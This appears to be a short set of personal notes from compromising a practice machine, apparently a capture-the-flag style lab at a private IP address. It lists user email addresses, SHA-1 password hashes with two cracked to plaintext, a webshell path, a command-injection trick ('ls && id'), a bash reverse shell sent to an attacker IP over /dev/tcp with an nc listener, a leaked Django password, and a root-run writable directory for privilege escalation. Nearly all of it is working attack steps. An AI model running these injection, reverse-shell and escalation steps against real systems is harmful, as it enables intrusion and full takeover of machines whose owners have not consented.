url=192.168.1.155

Potentiell users:
alan@bulldogindustries.com
william@bulldogindustries.com
malik@bulldogindustries.com
kevin@bulldogindustries.com
ashley@bulldogindustries.com
nick@bulldogindustries.com
sarah@bulldogindustries.com

Password hashes are in the source code.
6515229daf8dbdc8b89fed2e60f107433da5f2cb
38882f3b81f8f2bc47d9f3119155b05f954892fb
c6f7e34d5d08ba4a40dd5627508ccb55b425e279
0e6ae9fe8af1cd4192865ac97ebf6bda414218a9
553d917a396414ab99785694afd51df3a8a8a3e0
ddf45997a7e18a25ad5f5cf222da64814dd060d5 -> bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e -> bulldoglover


go to webshell $url/dev/shell

you can execute commands not allowed like that:
ls && id

ref shell with

ls && bash -c 'exec bash -i &>/dev/tcp/192.168.1.158/5555 <&1'
and listening with

nc -nvlp 5555

password for django is SUPERultimatePASSWORDyouCANTget -> is encoded in /hom/bulldogadmin/.hiddenadmindirectory/customPermissionApp

under /AV*/* is writeable, and wil every minute be called as root